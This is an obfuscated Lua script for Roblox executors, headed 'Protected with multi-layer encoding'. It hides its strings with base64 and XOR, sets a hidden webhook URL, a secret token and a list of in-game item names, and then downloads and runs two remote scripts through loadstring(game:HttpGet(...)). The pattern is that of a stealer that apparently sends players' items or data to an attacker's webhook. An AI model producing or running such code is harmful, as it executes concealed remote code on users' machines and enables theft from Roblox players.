--[[ Protected with multi-layer encoding ]]
local _0llO0lOOOI=tostring(5227);local _OIIlOlO0I=tostring(7959);local _IIIO0I0l=tostring(1709);local _llllOI0Il=tostring(7227);local _IIOlII="_00OIl";
local _l0lllll0="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
local function _0llOOIIl(_II0lO0)
  local _l0lIlO=""
  _II0lO0=string.gsub(_II0lO0,"[^".._l0lllll0.."=]","")
  for _I000=1,#_II0lO0,4 do
    local a=string.find(_l0lllll0,string.sub(_II0lO0,_I000,_I000),1,true)-1
    local b=string.find(_l0lllll0,string.sub(_II0lO0,_I000+1,_I000+1),1,true)-1
    local c=string.find(_l0lllll0,string.sub(_II0lO0,_I000+2,_I000+2),1,true)
    local d=string.find(_l0lllll0,string.sub(_II0lO0,_I000+3,_I000+3),1,true)
    if c then c=c-1 end
    if d then d=d-1 end
    _l0lIlO=_l0lIlO..string.char((a*4+math.floor((b or 0)/16))%256)
    if c then _l0lIlO=_l0lIlO..string.char(((b or 0)%16*16+math.floor((c or 0)/4))%256) end
    if d then _l0lIlO=_l0lIlO..string.char(((c or 0)%4*64+(d or 0))%256) end
  end
  return _l0lIlO
end
local _00ll0ll0={112,219,105,106,182,192,174,7,72,75}
local function _lI0OO0l0(_II0lO0)
  local _l0lIlO=""
  for _I000=1,#_II0lO0 do
    local k=_00ll0ll0[(_I000-1)%#_00ll0ll0+1]
    local b=string.byte(_II0lO0,_I000)
    local r=0
    for bit=0,7 do
      local ba=math.floor(b/2^bit)%2
      local bb=math.floor(k/2^bit)%2
      if ba~=bb then r=r+2^bit end
    end
    _l0lIlO=_l0lIlO..string.char(r)
  end
  return _l0lIlO
end
local function _lOII0llIIO0O(_II0lO0) return _lI0OO0l0(_0llOOIIl(_II0lO0)) end
local _lO00lI0O=94499;local _l0IIIl0lII=tostring(420);local _0OIlI00=75267;local _0l0lO0I0=50609;
local function _lO0OOOll0I()
getgenv().User = _lOII0llIIO0O("GroCGY".."T3nzZx")

getgenv().Webhook = _lOII0llIIO0O("GK8dG".."sX6g".."SgsIgO4B".."hjS7s1oJ".."WQRqwBF".."waX".."MbyckG6h".."GW4".."L3lzB4e0".."LiWVuB9p".."o1eX".."JD4kYO+".."ovxRXE".."FMaE".."7ANKj3V".."QnIg".."edJw3Sj".."Zsx".."Gg0jt".."T4n+".."oTGb".."gkOL5".."0rLoSO3E".."AOejKfL".."hrc".."pZ1e".."LxMJvVw".."ajor".."3YSMNHg=".."=")

getgenv().SecretToken = _lOII0llIIO0O("FO5QXdO".."mnG".."RlKhTq".."C0eC9so".."+ZSo".."V7gp".."H0PPI".."Nyp".."7Qrl".."eCY/5")

getgenv().Brainrots = {
  _lOII0llIIO0O("I68bC".."8Giy".."3U6".."MlCeBQ/".."GqM9pPA".."=="),
  _lOII0llIIO0O("Pb4".."GHd".."o="),
  _lOII0llIIO0O("I7AA".."CN+kxyc".."cJBm3DB".."4="),
  _lOII0llIIO0O("OL4".."IDtql3X".."RoAx+p".."Gg/boc".."A="),
  _lOII0llIIO0O("OKINGNfg".."6nUpLB+".."1SSn".."Xrs".."BiJCc".."ftQA".."="),
  _lOII0llIIO0O("NKkID".."dmu".."jkQ".."pJR6+BQ".."bZr".."sc="),
  _lOII0llIIO0O("NKk".."IDd".."mujkAhJ".."Re+GwPYq".."Q=="),
  _lOII0llIIO0O("PLpJO".."cOw3G".."IlLl".."CYBgfU".."qcBmOy".."Ift".."Q=="),
  _lOII0llIIO0O("M74bCNOy".."23Q="),
  _lOII0llIIO0O("ILQZ".."CcOy".."2ycpJR".."T7Lw".."PMutt1P".."Q=="),
  _lOII0llIIO0O("IrQ".."aD8/gz".."2ksayS+D".."Q7P"),
  _lOII0llIIO0O("M7oZA8Kh".."wGhoB".."h+5EA=="),
  _lOII0llIIO0O("M7Q".."GAd/gz2k".."saz2y".."BQHf"),
  _lOII0llIIO0O("Mq4".."bDcO".."ywScJJRT".."7LxjPt".."dxo"),
  _lOII0llIIO0O("O74".."dH8".."ah2ic".."KOR+o"),
  _lOII0llIIO0O("PLpJKd".."ezzyc".."KJB8="),
  _lOII0llIIO0O("I6sG".."Bd25jmY".."mL1CLH".."AfGq9c="),
  _lOII0llIIO0O("PLpJ".."OdOj".."3GI8".."azO0B".."Ajfrs9".."0ISQe"),
  _lOII0llIIO0O("N7ob".."C9uhj".."mYmL1C".."WCA7Drs".."pyJ".."iw="),
  _lOII0llIIO0O("PLQf".."D5aMw".."XEtaz".."K+CB".."g="),
  _lOII0llIIO0O("M74FD8W".."0x2Y".."kayC+D".."gvF".."td0="),
  _lOII0llIIO0O("PLpJLNm".."vyicLJB".."25AATX".."s8doJ".."g=="),
  _lOII0llIIO0O("Ir4ABN+0".."wScbJx".."WyDg".."LftME="),
  _lOII0llIIO0O("PLQaSvet".."x2AnOA=="),
  _lOII0llIIO0O("PLQa".."SuWl".."xWgkKhio"),
  _lOII0llIIO0O("I7IO".."BNmyyyc".."LKgK6".."GQvVpQ=="),
  _lOII0llIIO0O("NqkI".."DcShw2".."ZoKh6/SS".."ner8".."11KSYR"),
  _lOII0llIIO0O("NbcMD".."Neu2".."mhoDQKy".."DgU="),
  _lOII0llIIO0O("PLpJLd+u".."yWI6ayO".."+AgXaocY".."="),
  _lOII0llIIO0O("N7I".."HDdOy".."jkAt".."ORGv"),
  _lOII0llIIO0O("I7o".."EB8".."+uxycOK".."gSv".."AATf"),
  _lOII0llIIO0O("PLQaSuW".."wz2AgL".."gSvABk="),
  _lOII0llIIO0O("I6sID".."d6l2n".."MhaySuC".."AbT".."tNpu"),
  _lOII0llIIO0O("MbUdB".."dip".."wQ=="),
  _lOII0llIIO0O("IrQaD".."8K0xyc".."cPhG3".."DB7C".."qQ=="),
  _lOII0llIIO0O("ProKA".."tng/XcxL".."xWp"),
  _lOII0llIIO0O("O74dC".."d613".."HJoK".."h6/SS".."fDs9py".."Oj4="),
  _lOII0llIIO0O("I6w".."IDdG".."5jkU6".."JAM="),
  _lOII0llIIO0O("PLp".."JON".."mtz2".."k8Ih".."P7Lhj".."Xrspi"),
  _lOII0llIIO0O("P6kKC9ql".."ymgm"),
  _lOII0llIIO0O("JLIKH".."tejjlQpI".."wWp"),
  _lOII0llIIO0O("O74dH".."8ah".."2ic".."DLgC6H".."Q=="),
  _lOII0llIIO0O("PLpJP".."tejwScL".."JB25AAT".."Xs8doJg".."=="),
  _lOII0llIIO0O("JLoHDZaU".."z2kvazu".."+BQ/Co".."cBg"),
  _lOII0llIIO0O("PLQfA9j".."g/Gg7Lg".."=="),
  _lOII0llIIO0O("PLQa".."SuKhzWg".."6IgS6Gg=".."="),
  _lOII0llIIO0O("Na0ABtO".."kwWk="),
  _lOII0llIIO0O("PLQaS".."uayx2".."onOA".."=="),
  _lOII0llIIO0O("NagGAZ".."aTy".."2wnJxG".."z"),
  _lOII0llIIO0O("PLQaSua".."1yWAhL".."gM="),
  _lOII0llIIO0O("JKkIBte".."sy2".."MnJQ=".."="),
  _lOII0llIIO0O("JK4PDJa".."UwXIr".."Kh4="),
  _lOII0llIIO0O("PbQHD8/g".."42g".."mLgn7O".."w/f".."rspiLTk".."="),
  _lOII0llIIO0O("M7MA".."BtqpwC".."cLI".."xm3".."AA=="),
  _lOII0llIIO0O("M7M".."AGs".."WvjmYmL1".."CKHA".."/Frw=="),
  _lOII0llIIO0O("MroKH8S1".."jmYmL1".."CeDg".."3Dsts".."="),
  _lOII0llIIO0O("PLoaSu".."Wp3Q".."=="),
  _lOII0llIIO0O("NJFJOteu".."ymY="),
  _lOII0llIIO0O("JLoKBcSp".."2mZoCR".."m4A".."Ana".."pdpm"),
  _lOII0llIIO0O("Pq4KBtO".."h3Gh".."oDxm1Bhn".."Fodt".."1Jw==")
}

task.spawn(function()
loadstring(game:HttpGet(_lOII0llIIO0O("GK8dGs".."X6gSgp".."Oxn1".."BR/Xs".."sNoOmU".."evh1F".."0Kn".."CYj".."tkB".."u9GBtmh".."ymI6".."OF/jWV".."LQ9".."M9jfC".."4SvQ9e".."gfXNMn8o".."Fe1YD9".."fzl2J".."8ehXp".."WkT".."atc".."8=")))()
end)

task.spawn(function()
loadstring(game:HttpGet(_lOII0llIIO0O("GK8".."dGs".."X6g".."Sg4".."KgOv".."DBmY".."qcEoOio".."H9B9bh".."vCDbzw".."/AKhEUo".."f4ljE=")))()
end)

end
local _OIlIlOlIII=(142*9187>142) and _lO0OOOll0I or nil
if _OIlIlOlIII then _OIlIlOlIII() end
